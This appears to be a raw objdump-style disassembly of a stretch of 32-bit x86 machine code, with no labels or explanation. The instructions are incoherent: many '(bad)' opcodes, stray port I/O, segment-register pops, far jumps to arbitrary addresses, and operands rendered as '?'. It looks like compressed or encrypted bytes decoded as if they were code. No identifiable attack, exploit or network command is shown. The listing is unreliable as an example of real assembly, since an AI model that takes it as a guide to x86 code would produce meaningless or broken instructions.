  4137d9:	sbb    DWORD PTR [esi-0x406d930a],0xffffffaa
  4137e0:	and    DWORD PTR [eax+0x51],ebp
  4137e3:	jp     0x41384e
  4137e5:	pop    edi
  4137e6:	sahf   
  4137e7:	das    
  4137e8:	outs   dx,DWORD PTR ds:[esi]
  4137e9:	mov    edx,0x10f7c29b
  4137ee:	pop    ds
  4137ef:	jmp    0xc0525683
  4137f4:	cld    
  4137f5:	mov    edi,0xc07324cb
  4137fa:	jmp    0xb1ff4eb2
  4137ff:	into   
  413800:	(bad)  
  413801:	leave  
  413802:	pusha  
  413803:	jb     0x41382d
  413805:	js     0x413820
  413807:	ins    DWORD PTR es:[edi],dx
  413808:	call   0xfdb974e8
  41380d:	aaa    
  41380e:	cwde   
  41380f:	push   edi
  413810:	(bad)  
  413811:	out    0xbf,al
  413813:	jns    0x41380a
  413815:	mov    eax,ds:0x3690ae3b
  41381a:	or     eax,0xd9c09e5f
  41381f:	xlat   BYTE PTR ds:[ebx]
  413820:	rcl    DWORD PTR [esi+eiz*8-0x5b75824f],cl
  413827:	xchg   esi,esp
  413829:	cmp    esi,DWORD PTR [ecx-0x38]
  41382c:	aad    0x60
  41382e:	sbb    DWORD PTR [bx-0x1a],0x57
  413833:	icebp  
  413834:	sbb    bh,BYTE PTR [edx]
  413836:	stos   BYTE PTR es:[edi],al
  413837:	adc    ch,BYTE PTR [esi-0x6]
  41383a:	jo     0x413830
  41383c:	fidiv  WORD PTR [ebx]
  41383e:	stos   DWORD PTR es:[edi],eax
  41383f:	mov    cl,0x3f
  413841:	mov    cs,WORD PTR [edi+0x728b03ab]
  413847:	ret    0x9ebc
  41384a:	jo     0x4138c8
  41384c:	adc    ah,BYTE PTR [ecx-0xdf0496e]
  413852:	pop    esi
  413853:	mov    al,ds:0x24245f84
  413858:	pushf  
  413859:	arpl   WORD PTR [edx+0x1d3f1adb],si
  41385f:	mov    edx,0xa737e2d4
  413864:	mov    edx,0xd348d344
  413869:	xchg   esi,eax
  41386a:	lods   al,BYTE PTR ds:[esi]
  41386b:	push   ds
  41386c:	out    0x4e,al
  41386e:	fistp  DWORD PTR [esi-0x30ca20b1]
  413874:	add    BYTE PTR [ecx+edi*4-0xe44e978],0x31
  41387c:	leave  
  41387d:	test   DWORD PTR [ecx],ebx
  41387f:	adc    al,bl
  413881:	adc    DWORD PTR [edx],esi
  413883:	sbb    DWORD PTR [eax],0xffffffb3
  413886:	jmp    0x3622cc52
  41388b:	adc    al,0x28
  41388d:	clc    
  41388e:	jle    0x4138c9
  413890:	hlt    
  413891:	and    DWORD PTR [esi+esi*4+0x6261763d],ebp
  413898:	jb     0x41389d
  41389a:	ds call 0x8f4f:0x9cdefa
  4138a2:	fbstp  TBYTE PTR [ebx+0x57]
  4138a5:	pop    edi
  4138a6:	pop    ebx
  4138a7:	arpl   ax,sp
  4138a9:	(bad)
  4138ad:	int3   
  4138ae:	aam    0x84
  4138b0:	mov    ch,0x17
  4138b2:	adc    bh,BYTE PTR [esi+0x66217ae7]
  4138b8:	add    BYTE PTR [esi],ah
  4138ba:	mov    esp,0xd8b476ec
  4138bf:	popf   
  4138c0:	retf   
  4138c1:	stc    
  4138c2:	ret    
  4138c3:	ss dec ebp
  4138c5:	sub    al,0x7
  4138c7:	sub    BYTE PTR [edi],al
  4138c9:	push   edi
  4138ca:	aas    
  4138cb:	xor    ebx,DWORD PTR [eax+0x66571bf3]
  4138d1:	and    bh,BYTE PTR [ecx+eax*2]
  4138d4:	jle    0x413918
  4138d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138d7:	(bad)  
  4138d8:	scas   al,BYTE PTR es:[edi]
  4138d9:	cli    
  4138da:	das    
  4138db:	(bad)  
  4138dc:	jl     0x4138d4
  4138de:	jo     0x4138d9
  4138e0:	inc    esp
  4138e1:	(bad)  
  4138e3:	fst    QWORD PTR [eax+0x10]
  4138e6:	lods   al,BYTE PTR ds:[esi]
  4138e7:	jne    0x413951
  4138e9:	aas    
  4138ea:	jns    0x4138b9
  4138ec:	mov    ds:0x48c9a806,eax
  4138f1:	bound  edx,QWORD PTR [eax+0x1a1318cb]
  4138f7:	and    cl,BYTE PTR [ebx-0x68]
  4138fa:	pop    DWORD PTR [ecx-0x3abde6f2]
  413900:	cld    
  413901:	jmp    0x9707be22
  413906:	pop    ecx
  413907:	jl     0x413978
  413909:	dec    eax
  41390a:	popa   
  41390b:	push   ebp
  41390c:	sub    al,0x4a
  41390e:	cs ss or eax,0x6cf674a6
  413915:	xchg   esi,eax
  413916:	add    BYTE PTR [edx],ah
  413918:	mov    esi,0x5aed7435
  41391d:	xchg   edi,eax
  41391e:	(bad)  
  41391f:	fimul  DWORD PTR [edx-0x4060f153]
  413925:	fadd   DWORD PTR [ebx-0x344fbb74]
  41392b:	jg     0x4139a6
  41392d:	out    0xa9,eax
  41392f:	xlat   BYTE PTR ds:[ebx]
  413930:	sub    BYTE PTR [eax+esi*2+0x6b029012],bl
  413937:	xor    DWORD PTR [ebx-0xc],0x5e062f84
  41393e:	(bad)  
  41393f:	mov    ds:0xdd582cba,al
  413944:	xor    DWORD PTR [edx-0x7daef994],eax
  41394a:	mov    al,0x86
  41394c:	xchg   ecx,eax
  41394d:	inc    ebx
  41394e:	out    0x70,eax
  413950:	stc    
  413951:	scas   eax,DWORD PTR es:[edi]
  413952:	mov    eax,ds:0x9ea69e54
  413957:	fst    QWORD PTR [eax-0x61]
  41395a:	and    eax,0x3f7ce6ca
  41395f:	aaa    
  413960:	ror    DWORD PTR [edi],1
  413962:	in     al,0x19
  413964:	push   cs
  413965:	mov    cl,al
  413967:	cmc    
  413968:	push   ebp
  413969:	test   eax,0xb612d151
  41396e:	test   BYTE PTR [edx+0x4ca4aca0],0xf9
  413975:	xor    eax,0xa1cb5ea5
  41397a:	pop    esp
  41397b:	inc    eax
  41397c:	gs pop ebp
  41397e:	rcr    DWORD PTR [ebp+0x627e1698],1
  413984:	mov    al,0x77
  413986:	push   esi
  413987:	pop    esi
  413988:	aad    0xa2
  41398a:	sub    al,BYTE PTR ds:0x41f31408
  413990:	rcl    ebx,0x91
  413993:	mov    ds:0xd447b44,al
  413998:	mov    bh,0x93
  41399a:	ja     0x413990
  41399c:	mov    edi,0x201d4f89
  4139a1:	mov    ah,0x64
  4139a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139a5:	cmp    BYTE PTR [esi+0x31],0xa5
  4139a9:	addr16 test eax,0x2bfebc9f
  4139af:	hlt    
  4139b0:	xchg   esi,eax
  4139b1:	int    0x4f
  4139b3:	fsub   QWORD PTR [edx+0x1b9ce8d1]
  4139b9:	in     eax,0xe0
  4139bb:	cmp    edi,ebp
  4139bd:	mov    ds:0x85912965,al
  4139c2:	dec    eax
  4139c3:	in     al,dx
  4139c4:	shl    BYTE PTR [eax+ebx*1+0xb22546a],0x20
  4139cc:	or     al,0x94
  4139ce:	int    0xa7
  4139d0:	into   
  4139d1:	xchg   esp,eax
  4139d2:	sub    al,0x19
  4139d4:	pop    esi
  4139d5:	adc    DWORD PTR [edx-0xcc3bc22],esi
  4139db:	in     eax,dx
  4139dc:	pop    ebp
  4139dd:	push   edx
  4139de:	xor    ch,al
  4139e0:	mov    cl,0xca
  4139e2:	xor    BYTE PTR [edi],bh
  4139e4:	sar    esp,cl
  4139e6:	pop    edx
  4139e7:	xchg   ebx,eax
  4139e8:	fs xchg esi,eax
  4139ea:	out    dx,eax
  4139eb:	dec    ebx
  4139ec:	out    dx,eax
  4139ed:	dec    ebp
  4139ee:	push   esp
  4139ef:	push   ecx
  4139f0:	mov    eax,0xe3b319c9
  4139f5:	gs in  eax,0xe0
  4139f8:	daa    
  4139f9:	cmp    al,0xb2
  4139fb:	xor    al,0xed
  4139fd:	ret    
  4139fe:	mov    bh,BYTE PTR [eax]
  413a00:	push   ss
  413a01:	mov    ah,BYTE PTR [ebx+0x43]
  413a04:	sbb    DWORD PTR [esi],esp
  413a06:	loope  0x413a2d
  413a08:	mov    bh,0x49
  413a0a:	pop    esp
  413a0b:	mov    eax,ds:0x5642b303
  413a10:	sub    ecx,ebp
  413a12:	pop    esi
  413a13:	cmp    al,ah
  413a15:	das    
  413a16:	sbb    BYTE PTR [eax],dl
  413a18:	rol    BYTE PTR [ecx+0x3a],cl
  413a1b:	call   0xad29:0x1de70621
  413a22:	cmp    al,0x35
  413a24:	nop
  413a25:	lods   eax,DWORD PTR ds:[esi]
  413a26:	popa   
  413a27:	mov    dh,dh
  413a29:	jmp    0x2f5e:0xc4912c6d
  413a30:	and    ebx,DWORD PTR [eax+0x59]
  413a33:	jae    0x413a53
  413a35:	mov    eax,0x39d5ee26
  413a3a:	fisubr WORD PTR [ebp+0x7e]
  413a3d:	xchg   ecx,eax
  413a3e:	clc    
  413a3f:	pop    ecx
  413a40:	scas   al,BYTE PTR es:[edi]
  413a41:	call   FWORD PTR [ebp-0x549785f5]
  413a47:	or     ebx,edi
  413a49:	(bad)  
  413a4a:	jne    0x413a52
  413a4c:	or     al,BYTE PTR [eax+0x70a607dd]
  413a52:	popf   
  413a53:	aaa    
  413a54:	cld    
  413a55:	jb     0x413ab6
  413a57:	xor    al,0x59
  413a59:	or     bh,BYTE PTR [ebp+0x60]
  413a5c:	ret    
  413a5d:	ds (bad) 
  413a5f:	leave  
  413a60:	ret    
  413a61:	sub    ecx,0xffffffe6
  413a64:	aas    
  413a65:	pop    ss
  413a66:	pop    ds
  413a67:	push   es
  413a68:	cmp    BYTE PTR [ecx+0x19],0x36
  413a6c:	jnp    0x413a81
  413a6e:	outs   dx,DWORD PTR ds:[esi]
  413a6f:	mov    al,0xc6
  413a71:	push   eax
  413a72:	nop
  413a73:	je     0x413a6e
  413a75:	in     eax,dx
  413a76:	dec    eax
  413a77:	and    BYTE PTR [esi],cl
  413a79:	ffree  st(3)
  413a7b:	adc    ebp,DWORD PTR ds:0x4d6d7aef
  413a81:	mov    ah,0x4b
  413a83:	pop    esp
  413a84:	loopne 0x413a6c
  413a86:	cmp    ebx,DWORD PTR [ecx+0x318949ed]
  413a8c:	stos   BYTE PTR es:[edi],al
  413a8d:	xor    esi,DWORD PTR [esp+eax*4-0x6376860f]
  413a94:	test   al,0x96
  413a96:	sub    al,0xa7
  413a98:	dec    ecx
  413a99:	cmp    cl,BYTE PTR [ebp+0x2ba8378b]
  413a9f:	pusha  
  413aa0:	bound  eax,QWORD PTR [edi-0x2e0085ce]
  413aa6:	(bad)  
  413aa7:	pop    edx
  413aa8:	(bad)  
  413aa9:	jle    0x413ac0
  413aab:	mov    esp,0x988b6412
  413ab0:	cs push edx
  413ab2:	mov    al,ds:0xd0d12636
  413ab7:	sbb    cl,0xe5
  413aba:	(bad)  
  413abb:	lods   eax,DWORD PTR ds:[esi]
  413abc:	add    eax,0x922d67b7
  413ac1:	ret    
  413ac2:	jns    0x413ab6
  413ac4:	sar    esp,cl
  413ac6:	std    
  413ac7:	neg    dh
  413ac9:	enter  0xb374,0x8c
  413acd:	mov    ds:0x40e3e4a1,al
  413ad2:	xlat   BYTE PTR ds:[ebx]
  413ad3:	in     eax,dx
  413ad4:	mov    esi,0xfdc24261
  413ad9:	cwde   
  413ada:	pop    edx
  413adb:	js     0x413a86
  413add:	data16 mov dh,0x37
  413ae0:	pop    ecx
  413ae1:	pop    ebp
  413ae2:	sahf   
  413ae3:	and    al,0xe6
  413ae5:	add    al,0x92
  413ae7:	mov    dh,0x76
  413ae9:	add    al,0xb8
  413aeb:	pushf  
  413aec:	push   ds
  413aed:	cmp    al,0x39
  413aef:	inc    eax
  413af0:	scas   al,BYTE PTR es:[edi]
  413af1:	fcmove st,st(3)
  413af3:	or     bl,BYTE PTR [esi+0x35275d83]
  413af9:	push   0xf44c066f
  413afe:	push   ds
  413aff:	xchg   ebp,eax
  413b00:	out    0x2,al
  413b02:	xchg   ecx,eax
  413b03:	lds    eax,FWORD PTR [ecx+esi*2-0x21c2fd6b]
  413b0a:	aad    0xe0
  413b0c:	das    
  413b0d:	iret   
  413b0e:	cmp    al,0xd1
  413b10:	inc    ebp
  413b11:	sub    al,0x8c
  413b13:	fld    QWORD PTR [edi+0x4bde39f3]
  413b19:	jnp    0x413ae8
  413b1b:	add    cl,ah
  413b1d:	call   0x4112:0x96096eef
  413b24:	xchg   ebx,eax
  413b25:	mov    ebx,0xa4aee858
  413b2a:	and    eax,0x9377dce5
  413b2f:	sbb    edi,edx
  413b31:	or     al,0x31
  413b33:	sbb    DWORD PTR [eax-0x70],edx
  413b36:	push   ebp
  413b37:	inc    edi
  413b38:	xor    BYTE PTR [ebx],dh
  413b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b3b:	dec    ebx
  413b3c:	leave  
  413b3d:	enter  0x771c,0xb3
  413b41:	inc    edi
  413b42:	or     BYTE PTR [edx-0x4ccbe54b],al
  413b48:	pop    esp
  413b49:	in     al,dx
  413b4a:	in     al,0xfc
  413b4c:	pusha  
  413b4d:	or     dh,dl
  413b4f:	leave  
  413b50:	mov    al,ds:0x9a84a309
  413b55:	dec    edi
  413b56:	mov    ebx,0x20461135
  413b5b:	push   esp
  413b5c:	mov    ds:0xd5628bfe,al
  413b61:	ja     0x413b95
  413b63:	loopne 0x413ba0
  413b65:	inc    edx
  413b66:	xlat   BYTE PTR ds:[ebx]
  413b67:	ficom  WORD PTR [ecx-0x596a614c]
  413b6d:	mov    bl,BYTE PTR [eax+0x39366ee8]
  413b73:	jl     0x413b03
  413b75:	jecxz  0x413b26
  413b77:	stc    
  413b78:	or     DWORD PTR [eax-0x80],edx
  413b7b:	outs   dx,BYTE PTR ds:[esi]
  413b7c:	adc    al,0x7e
  413b7e:	popa   
  413b7f:	jbe    0x413ba6
  413b81:	loop   0x413b8e
  413b83:	cwde   
  413b84:	mov    cl,0x53
  413b86:	sub    eax,0xb8a116e2
  413b8b:	inc    edx
  413b8c:	xor    DWORD PTR [ecx],ebp
  413b8e:	mov    al,0x8e
  413b90:	sub    DWORD PTR [edx-0x30],esi
  413b93:	mov    bh,0xf4
  413b95:	mov    al,0x91
  413b97:	cmp    eax,0xc8989934
  413b9c:	mov    edx,0xbebca18f
  413ba1:	pop    ss
  413ba2:	dec    esi
  413ba3:	inc    esi
  413ba4:	fwait
  413ba5:	lods   al,BYTE PTR ds:[esi]
  413ba6:	iret   
  413ba7:	call   0x7e68:0xf7910f51
  413bae:	dec    ecx
  413baf:	stos   BYTE PTR es:[edi],al
  413bb0:	sti    
  413bb1:	das    
  413bb2:	mov    ah,0x58
  413bb4:	dec    edi
  413bb5:	stos   DWORD PTR es:[edi],eax
  413bb6:	xchg   esi,eax
  413bb7:	ins    BYTE PTR es:[edi],dx
  413bb8:	fs inc eax
  413bba:	or     dh,BYTE PTR [ebp+ecx*8+0x43ec03a4]
  413bc1:	pop    ebx
  413bc2:	(bad)  
  413bc5:	outs   dx,DWORD PTR ds:[esi]
  413bc6:	(bad)  
  413bc7:	loop   0x413c29
  413bc9:	aaa    
  413bca:	sti    
  413bcb:	pop    esp
  413bcc:	leave  
  413bcd:	push   ebp
  413bce:	int3   
  413bcf:	mov    bl,0x82
  413bd1:	lea    ebx,[edi+0x55]
  413bd4:	(bad)  
  413bd6:	ja     0x413b81
  413bd8:	push   ds
  413bd9:	sbb    bl,BYTE PTR [edx]
  413bdb:	mov    dh,0x12
  413bdd:	hlt    
  413bde:	xchg   BYTE PTR [eax+eiz*2+0x19],bh
  413be2:	(bad)  
  413be4:	push   es
  413be5:	test   DWORD PTR [edi-0x17],ecx
  413be8:	repnz mov ds:0x9aa3868a,eax
  413bee:	jmp    0x196:0x4a43a9a9
  413bf5:	cmp    eax,esp
  413bf7:	adc    al,0x5b
  413bf9:	stc    
  413bfa:	lea    esi,[ebx+0xe]
  413bfd:	fimul  WORD PTR [edi-0x74]
  413c00:	mov    bl,0x1a
  413c02:	jbe    0x413c51
  413c04:	cdq    
  413c05:	mov    ecx,0xf6d46318
  413c0a:	mov    WORD PTR [ecx],?
  413c0c:	xor    dh,BYTE PTR [esi+0x3214e3aa]
  413c12:	cdq    
  413c13:	int3   
  413c14:	mov    edi,0x96ff3ccc
  413c19:	xchg   esp,eax
  413c1a:	test   DWORD PTR [ecx+0x47],ecx
  413c1d:	hlt    
  413c1e:	dec    ebp
  413c1f:	add    dl,BYTE PTR [ecx]
  413c21:	adc    eax,0x86140937
  413c26:	lds    eax,FWORD PTR [ebx+0x42869c1a]
  413c2c:	mov    esp,0x93b231e
  413c31:	jecxz  0x413bf9
  413c33:	and    eax,0xbbe4d0ab
  413c38:	data16 ins BYTE PTR es:[edi],dx
  413c3a:	ja     0x413c1f
  413c3c:	lods   al,BYTE PTR ds:[esi]
  413c3d:	xchg   edi,eax
  413c3e:	out    dx,al
  413c3f:	push   es
  413c40:	mov    DWORD PTR [eax+0x2bc49d0a],edi
  413c46:	(bad)  
  413c47:	gs pop es
  413c49:	mov    ds:0x1d612adc,eax
  413c4e:	xlat   BYTE PTR ds:[ebx]
  413c4f:	xchg   dl,al
  413c51:	pop    edx
  413c52:	xor    DWORD PTR [esi],0xa856121f
  413c58:	mov    ch,BYTE PTR [esi]
  413c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c5b:	mov    ecx,0x2b58e1e3
  413c60:	fild   DWORD PTR ds:0x964be4e9
  413c66:	jnp    0x413c43
  413c68:	dec    edx
  413c69:	ret    0x561b
  413c6c:	into   
  413c6d:	or     BYTE PTR [edx+0x49dfb318],ch
  413c73:	daa    
  413c74:	stos   DWORD PTR es:[edi],eax
  413c75:	aam    0x7
  413c77:	fld    TBYTE PTR [eax-0x1002c991]
  413c7d:	or     al,0x84
  413c7f:	xchg   esp,eax
  413c80:	xchg   ebx,eax
  413c81:	in     al,0xd7
  413c83:	call   0x7fc11f0b
  413c88:	iret   
  413c89:	in     al,0x74
  413c8b:	mov    al,ds:0x43d2e466
  413c90:	dec    ecx
  413c91:	fxch   st(4)
  413c93:	fsub   QWORD PTR [eax-0x542c81f3]
  413c99:	jae    0x413c2f
  413c9b:	jb     0x413cd4
  413c9d:	in     eax,dx
  413c9e:	ret    0x51d3
  413ca1:	stos   DWORD PTR es:[edi],eax
  413ca2:	dec    eax
  413ca3:	mov    ds:0xe2de963c,eax
  413ca8:	sbb    ebp,DWORD PTR [ebx+0x55]
  413cab:	or     esp,esp
  413cad:	nop
  413cae:	jecxz  0x413cf2
  413cb0:	imul   ebx,DWORD PTR [ecx-0x5b4af4fc],0x1d
  413cb7:	icebp  
  413cb8:	push   eax
  413cb9:	lods   al,BYTE PTR ds:[esi]
  413cba:	sub    DWORD PTR [ebx-0x4d2529e5],ebx
  413cc0:	psraw  mm1,QWORD PTR [ebx-0x40]
  413cc4:	sahf   
  413cc5:	mov    ebp,0xf6a41a87
  413cca:	and    DWORD PTR ds:0xaac98557,edx
  413cd0:	add    ecx,DWORD PTR [ecx-0xfed3854]
  413cd6:	jp     0x413c86
  413cd8:	jle    0x413cbb
  413cda:	pop    esi
  413cdb:	inc    eax
  413cdc:	hlt    
  413cdd:	fs jbe 0x413c83
  413ce0:	and    eax,0x84ac882c
  413ce5:	jae    0x413d45
  413ce7:	pushf  
  413ce8:	stos   DWORD PTR es:[edi],eax
  413ce9:	xchg   eax,eax
  413ceb:	pop    esp
  413cec:	je     0x413d22
  413cee:	ins    DWORD PTR es:[edi],dx
  413cef:	pop    eax
  413cf0:	sub    eax,0x3f92fa9a
  413cf5:	mov    ecx,0x4e82a19f
  413cfa:	xor    bh,BYTE PTR [edi]
  413cfc:	pop    ds
  413cfd:	jge    0x413cd2
  413cff:	addr16 iret 
  413d01:	xlat   BYTE PTR ds:[ebx]
  413d02:	pop    esi
  413d03:	jge    0x413d7f
  413d05:	out    0x22,eax
  413d07:	inc    ebx
  413d08:	(bad)  
  413d09:	stc    
  413d0a:	xlat   BYTE PTR ds:[ebx]
  413d0b:	cdq    
  413d0c:	pop    ecx
  413d0d:	pop    ds
  413d0e:	outs   dx,BYTE PTR ds:[esi]
  413d0f:	std    
  413d10:	inc    esp
  413d11:	(bad)  
  413d12:	ret    0x43ab
  413d15:	shl    DWORD PTR [ebx+eax*8],cl
  413d18:	adc    eax,0x68853572
  413d1d:	test   DWORD PTR [edx+0x6ace3f79],ebx
  413d23:	mov    eax,cs
  413d25:	adc    cl,BYTE PTR [ecx+0x8]
  413d28:	pop    esi
  413d29:	mov    edx,0xf7b10dc8
  413d2e:	add    al,0xf7
  413d30:	jmp    ebp
  413d32:	jne    0x413da5
  413d34:	jb     0x413d05
  413d36:	and    DWORD PTR ds:0xd67b9f1f,esi
  413d3c:	inc    eax
  413d3d:	ftst   
  413d3f:	push   eax
  413d40:	(bad)  
  413d42:	fild   DWORD PTR [edi-0x7f525481]
  413d48:	adc    ch,BYTE PTR [ebx+ebx*1-0x6a69cce9]
  413d4f:	(bad)  
  413d50:	adc    DWORD PTR [esi],esp
  413d52:	push   ecx
  413d53:	shl    DWORD PTR [edx-0x51463811],0xd4
  413d5a:	div    ecx
  413d5c:	sub    dh,ah
  413d5e:	(bad)  
  413d60:	lods   al,BYTE PTR ds:[esi]
  413d61:	ficomp WORD PTR fs:[eax+ebx*2-0x5b76ebb1]
  413d69:	daa    
  413d6a:	inc    ebx
  413d6b:	xchg   edx,eax
  413d6c:	push   es
  413d6d:	sub    ebp,DWORD PTR [esi-0x22]
  413d70:	push   cs
  413d71:	sbb    esi,edx
  413d73:	leave  
  413d74:	add    al,0x8b
  413d77:	xor    DWORD PTR [ecx-0x2e5c9249],ecx
  413d7d:	(bad)  
  413d7e:	loopne 0x413daf
  413d80:	mov    ebp,0x5421af1e
  413d85:	call   0x3825:0xdf4f63a0
  413d8c:	cld    
  413d8d:	or     eax,0x60573467
  413d92:	sbb    edx,edx
  413d94:	sbb    BYTE PTR ds:0xbf23d2fa,ch
  413d9a:	mov    edx,0xed6ec5
  413d9f:	pop    ebx
  413da0:	sbb    esp,DWORD PTR ds:0x21639a1a
  413da6:	imul   esp,DWORD PTR [eax-0x53],0xffffff85
  413daa:	rcr    BYTE PTR [ebx+ebx*2-0x10],0x5e
  413daf:	xor    ebp,DWORD PTR [edx]
  413db1:	shl    BYTE PTR [edx+0x736ccaa5],1
  413db7:	jmp    0x2549:0x9caa7e53
  413dbe:	mov    edx,0x45617d32
  413dc3:	fiadd  WORD PTR es:[esi-0x6889717b]
  413dca:	enter  0x64e6,0x57
  413dce:	sbb    eax,0x67940de9
  413dd3:	aas    
  413dd4:	retf   
  413dd5:	repnz pop edi
  413dd7:	rol    DWORD PTR [eax],0x15
  413dda:	xchg   ecx,eax
  413ddb:	mov    eax,ds:0x45ee8eaa
  413de0:	xchg   esp,eax
  413de1:	call   FWORD PTR [eax+ebp*8+0x48]
  413de5:	push   eax
  413de6:	lahf   
  413de7:	stos   DWORD PTR es:[edi],eax
  413de8:	push   edx
  413de9:	sbb    dh,ah
  413deb:	push   ss
  413dec:	bound  ecx,QWORD PTR [esi-0x24]
  413def:	push   ecx
  413df0:	sub    esp,DWORD PTR [edi]
  413df2:	sbb    esp,edx
  413df4:	mov    al,0xa3
  413df6:	stos   BYTE PTR es:[edi],al
  413df7:	icebp  
  413df8:	xchg   edi,eax
  413df9:	mov    esi,0x12ed8d75
  413dfe:	int3   
  413dff:	scas   al,BYTE PTR es:[edi]
  413e00:	and    bh,BYTE PTR [edi]
  413e02:	adc    esp,esp
  413e04:	and    BYTE PTR [eax+ebp*2],dl
  413e07:	mov    ebx,0xd696a2a7
  413e0c:	imul   esi,DWORD PTR [ebp+0x171fb4a0],0x60bedf72
  413e16:	retf   
  413e17:	inc    esp
  413e18:	rcr    BYTE PTR [ecx+0x70],0xf4
  413e1c:	cmpxchg BYTE PTR [edi-0x2eae7b9d],dh
  413e23:	jmp    0x9f4c:0xb6b0b0dc
  413e2a:	rcl    BYTE PTR [ebx],cl
  413e2c:	push   edx
  413e2d:	push   ecx
  413e2e:	mov    bp,WORD PTR [ebx-0x6220ecbc]
  413e35:	cli    
  413e36:	iret   
  413e37:	fst    QWORD PTR [edx-0x1]
  413e3a:	pop    ecx
  413e3b:	push   esp
  413e3c:	add    al,0xbf
  413e3e:	in     eax,0x9f
  413e40:	ficomp DWORD PTR [esi-0x4feebee7]
  413e46:	mov    dl,0xa0
  413e48:	enter  0x2494,0xd3
  413e4c:	mov    dl,0x8d
  413e4e:	add    DWORD PTR [ebp+edx*8-0x6c],ebx
  413e52:	fs das 
  413e54:	std    
  413e55:	mov    ebx,0x8b9613a1
  413e5a:	(bad)  
  413e5b:	test   eax,0xc49b6692
  413e60:	outs   dx,DWORD PTR ds:[esi]
  413e61:	xlat   BYTE PTR ds:[ebx]
  413e62:	fsubr  st,st(5)
  413e64:	daa    
  413e65:	push   ecx
  413e66:	mov    ebp,DWORD PTR [esi+0x3d3f7ede]
  413e6c:	mov    edi,eax
  413e6e:	xchg   ecx,eax
  413e6f:	pop    ecx
  413e70:	stc    
  413e71:	ds ds push ecx
  413e74:	or     esp,DWORD PTR [eax]
  413e76:	cld    
  413e77:	out    dx,al
  413e78:	into   
  413e79:	sub    eax,0x58d20349
  413e7e:	shl    esi,cl
  413e80:	lods   eax,DWORD PTR ds:[esi]
  413e81:	push   ebp
  413e82:	pop    ebx
  413e83:	add    eax,0x347374e4
  413e88:	dec    edi
  413e89:	and    DWORD PTR [esi],edx
  413e8b:	xchg   ah,al
  413e8d:	dec    esi
  413e8e:	in     eax,0x81
  413e90:	imul   BYTE PTR [edi+0x73]
  413e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e94:	xchg   BYTE PTR [edi+0x16874266],cl
  413e9a:	imul   esp,DWORD PTR [eax-0x7de512d6],0x16
  413ea1:	(bad)
  413ea4:	dec    eax
  413ea5:	mov    dl,bh
  413ea7:	add    DWORD PTR [eax],esi
  413ea9:	fild   QWORD PTR [edx+0x6bf63dd9]
  413eaf:	cmp    al,0xfd
  413eb1:	mov    bh,0xfd
  413eb3:	gs adc al,0x8c
  413eb6:	mov    dh,0xdc
  413eb8:	pop    es
  413eb9:	or     eax,0xa3f98b23
  413ebe:	loopne 0x413eb6
  413ec0:	pop    esp
  413ec1:	sbb    eax,0xd64e4182
  413ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ec7:	and    BYTE PTR [ecx-0x4e],dh
  413eca:	ret    
  413ecb:	jns    0x413ef5
  413ecd:	repnz in al,dx
  413ecf:	pop    esp
  413ed0:	jl     0x413e75
  413ed2:	div    BYTE PTR [ebx]
  413ed4:	into   
  413ed5:	cs int3 
  413ed7:	int    0xef
  413ed9:	mov    dl,0x91
  413edb:	stos   BYTE PTR es:[edi],al
  413edc:	mov    bl,0x34
  413ede:	xchg   ebx,eax
  413edf:	cli    
  413ee0:	lods   eax,DWORD PTR ds:[esi]
  413ee1:	xor    al,0x5f
  413ee3:	inc    ebp
  413ee4:	lods   eax,DWORD PTR ds:[esi]
  413ee5:	ret    0x4afe
  413ee8:	in     eax,0x62
  413eea:	lods   al,BYTE PTR ds:[esi]
  413eeb:	cwde   
  413eec:	sub    bh,bh
  413eee:	aaa    
  413eef:	adc    ecx,DWORD PTR [esi-0x70]
  413ef2:	ss dec ebx
  413ef4:	int3   
  413ef5:	push   esp
  413ef6:	mov    dh,al
  413ef8:	push   ss
  413ef9:	inc    edx
  413efa:	ret    
  413efb:	lock shl BYTE PTR [eiz*2+0x745117af],0xb7
  413f04:	adc    BYTE PTR [ebp+0x45],bl
  413f07:	fcom   QWORD PTR [edx-0x3ee15e1f]
  413f0d:	push   0x8e8f2253
  413f12:	cmp    BYTE PTR [ebx],ah
  413f14:	lahf   
  413f15:	lds    esi,FWORD PTR [edi+ebx*8]
  413f18:	stos   BYTE PTR es:[edi],al
  413f19:	mov    esi,?
  413f1b:	aad    0xa3
  413f1d:	xor    eax,0x5bf9018d
  413f22:	xor    BYTE PTR [edx-0x7c5bf278],0x77
  413f29:	push   edi
  413f2a:	addr16 push ecx
  413f2c:	(bad)  
  413f2d:	ss hlt 
  413f2f:	pusha  
  413f30:	sub    BYTE PTR [esi-0x51],0xfe
  413f34:	lock or ah,BYTE PTR [edi+0x7ac58a67]
  413f3b:	mov    ds:0x6adb1328,al
  413f40:	push   es
  413f41:	loop   0x413fb7
  413f43:	pop    edi
  413f44:	sbb    eax,0x7dc0c1a3
  413f49:	bound  esp,QWORD PTR [eax*1-0x5dbacd4f]
  413f50:	and    al,0x75
  413f52:	pop    ecx
  413f53:	inc    ecx
  413f54:	cmp    cl,BYTE PTR [ebp+0x24]
  413f57:	mov    ds:0x28f36dea,al
  413f5c:	mov    dl,0x5d
  413f5e:	repnz fbld TBYTE PTR [edx]
  413f61:	push   esi
  413f62:	cmp    DWORD PTR [ecx+0x54],ecx
  413f65:	xor    edi,DWORD PTR ds:0x1c547003
  413f6b:	push   ss
  413f6c:	sub    esp,DWORD PTR [ecx-0x2f]
  413f6f:	mov    bl,0x60
  413f71:	dec    esi
  413f72:	jbe    0x413f6a
  413f74:	push   ecx
  413f75:	out    0xa8,eax
  413f77:	inc    ebp
  413f78:	sahf   
  413f79:	sbb    BYTE PTR [edx+0x77],ah
  413f7c:	aas    
  413f7d:	ds xchg edi,eax
  413f7f:	cdq    
  413f80:	out    dx,eax
  413f81:	jnp    0x413fe7
  413f83:	jae    0x413f0b
  413f85:	fs int3 
  413f87:	sub    ah,bl
  413f89:	or     BYTE PTR [edx+0x54cb1830],bh
  413f8f:	xlat   BYTE PTR ds:[ebx]
  413f90:	test   DWORD PTR [ebx+ecx*8],edx
  413f93:	addr16 test eax,0xf26a4873
  413f99:	mov    WORD PTR [edi],?
